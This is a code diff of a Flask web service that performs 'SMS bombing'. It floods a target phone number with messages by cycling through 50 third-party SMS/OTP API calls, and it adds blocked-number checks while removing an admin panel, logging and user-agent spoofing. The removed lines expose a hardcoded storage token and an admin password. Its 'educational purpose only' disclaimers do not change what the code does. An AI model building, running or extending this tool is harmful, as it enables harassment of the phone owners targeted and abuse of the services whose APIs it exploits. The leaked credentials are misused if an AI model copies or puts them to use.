@@ -1,15 +1,8 @@
 import time
 import random
-import os
-import json
-import base64
-from datetime import datetime, timedelta
-from functools import wraps
 from concurrent.futures import ThreadPoolExecutor
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify
 from flask_cors import CORS
-import requests
-from fake_useragent import UserAgent
 
 from api.utils import random_string
 from api.batch1 import *
@@ -20,111 +13,8 @@ from api.batch5 import *
 
 app = Flask(__name__)
 CORS(app)
-app.config['SECRET_KEY'] = os.urandom(24)
 
-# ============= VERCEL BLOB STORAGE =============
-BLOB_TOKEN = os.environ.get("BLOB_READ_WRITE_TOKEN", "vercel_blob_rw_iEm1cQll1zLO32rY_Nxymx4P2A6wXFLpVhixHib3Zm6hJP2")
-BLOB_BASE_URL = "https://blob.vercel-storage.com"
-
-class BlobStorage:
-    @staticmethod
-    def _request(method, path, data=None):
-        url = f"{BLOB_BASE_URL}/{path}"
-        headers = {
-            "Authorization": f"Bearer {BLOB_TOKEN}",
-            "Content-Type": "application/json"
-        }
-        if method == "GET":
-            resp = requests.get(url, headers=headers)
-        elif method == "PUT":
-            resp = requests.put(url, headers=headers, data=data)
-        elif method == "HEAD":
-            resp = requests.head(url, headers=headers)
-        else:
-            raise ValueError("Unsupported method")
-        return resp
-
-    @staticmethod
-    def get(key):
-        """Get blob content as string"""
-        try:
-            resp = BlobStorage._request("GET", key)
-            if resp.status_code == 200:
-                return resp.text
-            return None
-        except:
-            return None
-
-    @staticmethod
-    def put(key, content):
-        """Upload string content to blob"""
-        try:
-            resp = BlobStorage._request("PUT", key, data=content)
-            return resp.status_code == 200
-        except:
-            return False
-
-    @staticmethod
-    def exists(key):
-        """Check if blob exists"""
-        try:
-            resp = BlobStorage._request("HEAD", key)
-            return resp.status_code == 200
-        except:
-            return False
-
-# ============= DATA HELPERS =============
-def load_json(key, default):
-    """Load JSON from blob or return default"""
-    data = BlobStorage.get(key)
-    if data:
-        try:
-            return json.loads(data)
-        except:
-            return default
-    return default
-
-def save_json(key, data):
-    """Save JSON to blob"""
-    return BlobStorage.put(key, json.dumps(data, indent=2))
-
-def get_settings():
-    return load_json("settings.json", {"api_enabled": True})
-
-def save_settings(settings):
-    return save_json("settings.json", settings)
-
-def get_blocked_numbers():
-    return load_json("blocked_numbers.json", ["01744298642"])
-
-def save_blocked_numbers(numbers):
-    return save_json("blocked_numbers.json", numbers)
-
-def get_logs():
-    return load_json("logs.json", [])
-
-def save_logs(logs):
-    # Keep only last 2000 logs
-    if len(logs) > 2000:
-        logs = logs[-2000:]
-    return save_json("logs.json", logs)
-
-def add_log(entry):
-    logs = get_logs()
-    logs.append(entry)
-    save_logs(logs)
-
-# ============= ADMIN AUTH DECORATOR =============
-def admin_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or auth.username != "Admin" or auth.password != "1122":
-            return jsonify({"error": "Unauthorized"}), 401
-        return f(*args, **kwargs)
-    return decorated
-
-# ============= API FUNCTIONS (unchanged list) =============
+# List of all API functions
 API_FUNCTIONS = [
     api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
     api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19,
@@ -134,29 +24,24 @@ API_FUNCTIONS = [
     api_47, api_48, api_49, api_50
 ]
 
+# Blocked phone numbers list
+BLOCKED_NUMBERS = ['01744298642']
+
+def is_blocked_number(number):
+    """Check if the phone number is blocked"""
+    return number in BLOCKED_NUMBERS
+
 def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
-    """Execute a single API call with random user-agent"""
+    """Execute a single API call with proper parameters"""
+    # Check if number is blocked before making any API call
+    if is_blocked_number(number):
+        return False
+    
     try:
+        # Small random delay to avoid rate limiting
         time.sleep(random.uniform(0.05, 0.15))
         
-        # Apply random user-agent to requests globally for this call
-        ua = UserAgent()
-        original_get = requests.get
-        original_post = requests.post
-        def get_with_ua(*args, **kwargs):
-            headers = kwargs.get('headers', {})
-            headers['User-Agent'] = ua.random
-            kwargs['headers'] = headers
-            return original_get(*args, **kwargs)
-        def post_with_ua(*args, **kwargs):
-            headers = kwargs.get('headers', {})
-            headers['User-Agent'] = ua.random
-            kwargs['headers'] = headers
-            return original_post(*args, **kwargs)
-        requests.get = get_with_ua
-        requests.post = post_with_ua
-        
-        # Call the API
+        # Handle APIs with different parameter requirements
         if api_func in [api_9]:
             result = api_func(number, pgen, egen, did, name)
         elif api_func in [api_31]:
@@ -168,21 +53,26 @@ def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None,
         else:
             result = api_func(number)
         
-        # Restore original functions
-        requests.get = original_get
-        requests.post = original_post
-        
         if result and hasattr(result, 'status_code'):
             return result.status_code == 200
         return False
     except Exception:
-        # Restore on exception
-        requests.get = original_get
-        requests.post = original_post
         return False
 
 def execute_bombing(number, req_count):
     """Execute bombing requests and return combined statistics"""
+    
+    # Check if number is blocked before processing
+    if is_blocked_number(number):
+        return {
+            "status": "error",
+            "message": "Request blocked",
+            "error": "This phone number is not allowed to receive SMS",
+            "blocked_number": number,
+            "reason": "Number is on the restricted list",
+            "disclaimer": "⚠️ Educational purpose only"
+        }
+    
     total_sent = 0
     total_attempts = 0
     working_api_count = 0
@@ -192,6 +82,7 @@ def execute_bombing(number, req_count):
     start_time = time.time()
     
     for cycle in range(req_count):
+        # Generate random strings for each cycle
         pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
         egen = random_string("?n?n?n?n?n?n?n?n")
         did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
@@ -213,6 +104,7 @@ def execute_bombing(number, req_count):
                     total_sent += 1
                     cycle_success += 1
                     
+                    # Track working APIs
                     if api_name not in all_api_status:
                         all_api_status[api_name] = {"working": 0, "failed": 0}
                     all_api_status[api_name]["working"] += 1
@@ -221,11 +113,14 @@ def execute_bombing(number, req_count):
                         all_api_status[api_name] = {"working": 0, "failed": 0}
                     all_api_status[api_name]["failed"] += 1
         
+        # Delay between cycles
         if cycle < req_count - 1:
             time.sleep(1.5)
     
+    # Calculate final statistics
     execution_time = time.time() - start_time
     
+    # Count how many APIs worked at least once
     for api_name, status in all_api_status.items():
         if status["working"] > 0:
             working_api_count += 1
@@ -234,6 +129,7 @@ def execute_bombing(number, req_count):
     
     success_rate = (total_sent / total_attempts * 100) if total_attempts > 0 else 0
     
+    # Prepare formatted response
     response = {
         "status": "success",
         "message": "SMS bombing completed",
@@ -256,21 +152,13 @@ def execute_bombing(number, req_count):
     
     return response
 
-# ============= MAIN ENDPOINT =============
 @app.route('/', methods=['GET'])
 def root():
+    # Get parameters
     number = request.args.get('number')
     req_count = request.args.get('req')
     
-    # Check if API is enabled globally
-    settings = get_settings()
-    if not settings.get("api_enabled", True):
-        return jsonify({
-            "status": "error",
-            "message": "Service is temporarily disabled by admin",
-            "error": "API is currently OFF"
-        }), 503
-    
+    # Show usage guide if no parameters
     if number is None:
         return jsonify({
             "status": "error",
@@ -286,7 +174,21 @@ def root():
             "disclaimer": "⚠️ Educational purpose only"
         }), 400
     
+    # Validate phone number
     number = str(number).strip()
+    
+    # Check if number is blocked (early validation)
+    if is_blocked_number(number):
+        return jsonify({
+            "status": "error",
+            "message": "Access denied",
+            "error": "This phone number is restricted from receiving SMS messages",
+            "blocked_number": number,
+            "code": "BLOCKED_NUMBER",
+            "reason": "Number is on the restricted list",
+            "suggestion": "Please use a different phone number",
+            "disclaimer": "⚠️ Educational purpose only"
+        }), 403
     
     if not number.isdigit():
         return jsonify({
@@ -312,23 +214,7 @@ def root():
             "example": "01712345678"
         }), 400
     
-    # Check if number is blocked
-    blocked_numbers = get_blocked_numbers()
-    if number in blocked_numbers:
-        # Log failed attempt
-        add_log({
-            "timestamp": datetime.now().isoformat(),
-            "number": number,
-            "req_count": req_count if req_count else 1,
-            "status": "Failed",
-            "reason": "Number blocked"
-        })
-        return jsonify({
-            "status": "error",
-            "message": "This number is blocked from receiving SMS",
-            "error": "Number is in blocklist"
-        }), 403
-    
+    # Validate request count
     if not req_count:
         req_count = 1
     else:
@@ -352,155 +238,34 @@ def root():
             }), 400
     
     try:
+        # Execute bombing
         result = execute_bombing(number, req_count)
         
-        # Log successful attempt
-        add_log({
-            "timestamp": datetime.now().isoformat(),
-            "number": number,
-            "req_count": req_count,
-            "status": "Success" if result["summary"]["sms_sent"] > 0 else "Failed",
-            "sms_sent": result["summary"]["sms_sent"]
-        })
-        
+        # If result is an error response (blocked number), return with appropriate status code
+        if result.get("status") == "error" and result.get("code") == "BLOCKED_NUMBER":
+            return jsonify(result), 403
+            
         return jsonify(result), 200
         
     except Exception as e:
-        # Log error
-        add_log({
-            "timestamp": datetime.now().isoformat(),
-            "number": number,
-            "req_count": req_count,
-            "status": "Failed",
-            "reason": str(e)
-        })
         return jsonify({
             "status": "error",
             "message": "Execution failed",
             "error": str(e)
         }), 500
 
-# ============= ADMIN ENDPOINTS =============
-@app.route('/admin', methods=['GET'])
-def admin_panel():
-    """Serve admin HTML page"""
-    try:
-        with open('admin.html', 'r', encoding='utf-8') as f:
-            return f.read()
-    except:
-        return "Admin page not found", 404
-
-@app.route('/admin/status', methods=['GET'])
-@admin_required
-def admin_status():
-    settings = get_settings()
-    blocked = get_blocked_numbers()
-    return jsonify({
-        "api_enabled": settings.get("api_enabled", True),
-        "blocked_numbers": blocked
-    })
-
-@app.route('/admin/set_api_status', methods=['POST'])
-@admin_required
-def set_api_status():
-    data = request.json
-    enabled = data.get('enabled', True)
-    settings = get_settings()
-    settings['api_enabled'] = enabled
-    save_settings(settings)
-    return jsonify({"success": True, "api_enabled": enabled})
-
-@app.route('/admin/blocked', methods=['GET'])
-@admin_required
-def get_blocked():
-    return jsonify(get_blocked_numbers())
-
-@app.route('/admin/blocked/add', methods=['POST'])
-@admin_required
-def add_blocked():
-    data = request.json
-    number = str(data.get('number', '')).strip()
-    if not number or not number.isdigit() or len(number) != 11:
-        return jsonify({"error": "Invalid number format"}), 400
-    blocked = get_blocked_numbers()
-    if number not in blocked:
-        blocked.append(number)
-        save_blocked_numbers(blocked)
-    return jsonify({"success": True, "blocked_numbers": blocked})
-
-@app.route('/admin/blocked/remove', methods=['POST'])
-@admin_required
-def remove_blocked():
-    data = request.json
-    number = str(data.get('number', '')).strip()
-    blocked = get_blocked_numbers()
-    if number in blocked:
-        blocked.remove(number)
-        save_blocked_numbers(blocked)
-    return jsonify({"success": True, "blocked_numbers": blocked})
-
-@app.route('/admin/logs', methods=['GET'])
-@admin_required
-def get_logs_paginated():
-    page = int(request.args.get('page', 1))
-    per_page = int(request.args.get('per_page', 20))
-    logs = get_logs()
-    # Reverse to show newest first
-    logs.reverse()
-    total = len(logs)
-    start = (page - 1) * per_page
-    end = start + per_page
-    paginated_logs = logs[start:end]
-    return jsonify({
-        "logs": paginated_logs,
-        "total": total,
-        "page": page,
-        "per_page": per_page,
-        "total_pages": (total + per_page - 1) // per_page
-    })
-
-@app.route('/admin/stats', methods=['GET'])
-@admin_required
-def get_stats():
-    logs = get_logs()
-    today = datetime.now().date()
-    yesterday = today - timedelta(days=1)
-    this_month = today.replace(day=1)
-    
-    today_count = 0
-    yesterday_count = 0
-    month_count = 0
-    total_requests = len(logs)
-    
-    for log in logs:
-        try:
-            log_date = datetime.fromisoformat(log['timestamp']).date()
-            if log_date == today:
-                today_count += 1
-            if log_date == yesterday:
-                yesterday_count += 1
-            if log_date >= this_month:
-                month_count += 1
-        except:
-            pass
-    
-    return jsonify({
-        "total_requests": total_requests,
-        "today": today_count,
-        "yesterday": yesterday_count,
-        "monthly": month_count
-    })
-
-# ============= HEALTH CHECK =============
+# Health check endpoint
 @app.route('/health', methods=['GET'])
 def health_check():
     return jsonify({
         "status": "healthy",
         "service": "SMS API Service",
         "total_apis": len(API_FUNCTIONS),
+        "blocked_numbers": BLOCKED_NUMBERS,
         "timestamp": time.time()
     }), 200
 
+# Error handlers
 @app.errorhandler(404)
 def not_found(error):
     return jsonify({
@@ -508,18 +273,26 @@ def not_found(error):
         "message": "Endpoint not found",
         "available_endpoints": [
             "/?number=017xxxxxxxx&req=1",
-            "/health",
-            "/admin"
+            "/health"
         ]
     }), 404
+
+@app.errorhandler(500)
+def internal_error(error):
+    return jsonify({
+        "status": "error",
+        "message": "Internal server error",
+        "error": "Please try again later"
+    }), 500
 
 if __name__ == '__main__':
     print("=" * 50)
     print("SMS API Service (Educational Purpose)")
     print("=" * 50)
     print(f"Total APIs: {len(API_FUNCTIONS)}")
+    print(f"Blocked Numbers: {BLOCKED_NUMBERS}")
     print(f"Server: http://0.0.0.0:5000")
-    print(f"Admin Panel: http://0.0.0.0:5000/admin")
+    print(f"Example: http://0.0.0.0:5000/?number=01712345678&req=5")
     print("=" * 50)
     print("⚠️ FOR EDUCATIONAL USE ONLY")
     print("=" * 50)
